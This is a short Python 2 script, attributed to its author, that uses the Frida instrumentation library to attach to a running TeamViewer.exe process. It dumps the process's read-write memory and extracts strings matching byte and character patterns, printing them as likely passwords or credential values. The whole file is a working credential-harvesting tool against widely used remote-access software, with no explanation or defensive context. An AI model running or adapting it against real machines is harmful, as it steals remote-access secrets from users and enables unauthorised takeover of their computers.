#    @author Vladimir Egorov (@NotSoFunny)
#    @version 1.1 31/07/17 


import frida
import re

PERMS = 'rw-'
process = "TeamViewer.exe"
session = frida.attach(process)
print "Attached to process."
mems=session.enumerate_ranges(PERMS)
data_dump=[]
print "Check %s libs."%(len(mems))
for mem in mems:
	dump =  session.read_bytes(mem.base_address, mem.size)
	beg=chr(int('00',16))+chr(int('88',16))
	end=chr(int('00',16))+chr(int('00',16))+chr(int('00',16))
	for i in dump.split(beg):
		if i.find(end)>0 and i.index(end)<=33:
			data = i[:(i.index(end)+6)]
			data_dump.append(data)
session.detach()
print "Cleaning..."
mag_dump_mask_1=[]
mag_dump_mask_2=[]
for i in data_dump:
	try:
		if i.endswith(chr(int('20',16))+chr(int('00',16))+chr(int('00',16))):
			i=i[:len(i)-5]
			fnd = re.findall('[0-9a-f]{2}00',i.encode('hex'))
			if fnd:
				if len(fnd)==len(i)/2:
					mag_data=unicode(i.replace(chr(int('00',16)),""))	
					regx=ur'^[a-zA-Z0-9\!\"\#\$\%\&\'\(\)\*\+\,\-\.\/\:\;\<\=\>\?\@\[\\\]\^\_\`\{\|\}\~]*$'
					if re.compile(regx,re.U).match(mag_data) and len(mag_data)>=4 and not re.match(".*\.[\w]{2,4}$",mag_data):
						mag_dump_mask_1.append(mag_data)
		else:
			i=i[:len(i)-5]
			fnd = re.findall('[0-9a-f]{2}00',i.encode('hex'))
			if fnd:
				if len(fnd)==len(i)/2:
					mag_data=unicode(i.replace(chr(int('00',16)),""))	
					regx=ur'^[a-zA-Z0-9\!\"\#\$\%\&\'\(\)\*\+\,\-\.\/\:\;\<\=\>\?\@\[\\\]\^\_\`\{\|\}\~]*$'
					if re.compile(regx,re.U).match(mag_data) and len(mag_data)>=4 and not re.match(".*\.[\w]{2,4}$",mag_data):
						mag_dump_mask_2.append(mag_data)
	except:
		pass
if len(mag_dump_mask_1)>0:
	print "Potential values:"
	for i in mag_dump_mask_1:
		print i
else:
	ind = len(mag_dump_mask_2)
	for i in mag_dump_mask_2:
		if re.match("^[0-9]*$",i) and mag_dump_mask_2.count(i)>=2:
			if mag_dump_mask_2.index(i)<ind:
				ind = mag_dump_mask_2.index(i)
	print "Possible values: "
	for i in mag_dump_mask_2[ind:]:
		if mag_dump_mask_2[ind:].count(i) == 1:
			print i
	